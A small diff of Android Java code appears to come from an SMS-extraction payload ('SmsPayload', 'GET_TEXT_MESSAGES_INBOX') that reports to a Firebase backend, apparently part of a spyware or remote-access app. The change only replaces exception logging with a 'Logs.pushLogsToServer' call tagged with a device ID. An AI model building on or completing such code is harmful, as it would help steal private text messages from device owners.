@@ -11,6 +11,7 @@ import com.aigs.serviceone.helpers.FileSystem;
 import com.aigs.serviceone.annotations.PayloadTypes;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
 import com.aigs.serviceone.annotations.SmsModes;
+import com.example.logshandler.starter.Logs;
 import com.example.logshandler.starter.LogsHandler;
 import com.example.uniqueidmanager.UniqueId;
 import com.google.firebase.database.FirebaseDatabase;
@@ -70,22 +71,12 @@ public class SmsPayload extends AsyncTask<String, Integer, String> {
                     smsExtractorNotifier.onResponseEmpty();
                 }
             } catch (JSONException e) {
+                Logs.pushLogsToServer("[ERROR]: "+e.getMessage(),UniqueId.initialize(contextRef.get()).getUUID());
                 e.printStackTrace();
             }
         }catch (Exception e){
-            new LogsHandler.Builder(contextRef.get())
-                    .setDataToWrite(e.getMessage())
-                    .setDbReference("Logs")
-                    .setPathString(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"")
-                    .build()
-                    .pushPayloadLogToServer();
-
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(),UniqueId.initialize(contextRef.get()).getUUID());
             Log.e("EXCEPTION_SMS : ",e.getMessage());
-            FirebaseDatabase
-                    .getInstance()
-                    .getReference("Logs")
-                    .child(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"").child("CurrentLog").setValue(e.getMessage());
-
         }
 
         return null;
